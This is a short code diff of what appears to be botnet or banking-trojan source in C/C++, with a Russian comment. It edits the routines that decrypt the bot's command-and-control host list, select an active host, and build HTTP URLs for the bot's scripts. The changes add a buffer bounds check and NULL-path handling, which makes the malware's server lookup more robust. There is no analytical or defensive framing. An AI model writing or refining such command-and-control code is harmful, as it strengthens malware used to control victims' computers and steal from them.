@@ -286,7 +286,7 @@ PCHAR GetActiveHost()
 		}
 
 
-        return GetActiveHostFromBuf(BOT_HOSTS_ARRAY, HASH_EMPTY_HOSTS_BUF);
+		return GetActiveHostFromBuf(BOT_HOSTS_ARRAY, HASH_EMPTY_HOSTS_BUF);
 	#endif
 }
 //-----------------------------------------------------------------------------
@@ -305,7 +305,7 @@ PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash)
 
 	PCHAR Host = Hosts;
 
-	while (*Host != 0)
+	while (*Host != 0 && (Host - Hosts) < MAX_HOSTS_BUF_SIZE)
 	{
 		// декриптуем хост и проверяем его
 		PCHAR Result = STR::Alloc(StrCalcLength(Host));
@@ -338,9 +338,6 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
 	CFGDBG("Cofig", "Путь скрипта %s", Path);
 
 
-	if (STR::IsEmpty(Path))
-		return NULL;
-	
 
 	PCHAR Host = GetActiveHost();
 
@@ -349,7 +346,7 @@ PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
 	if (Host != NULL)
 	{
 		PCHAR Slash = NULL;
-		if (*Path != '/')
+		if (Path == NULL || *Path != '/')
         	Slash = "/";
 
 		Result = STR::New(4, "http://", Host, Slash, Path);
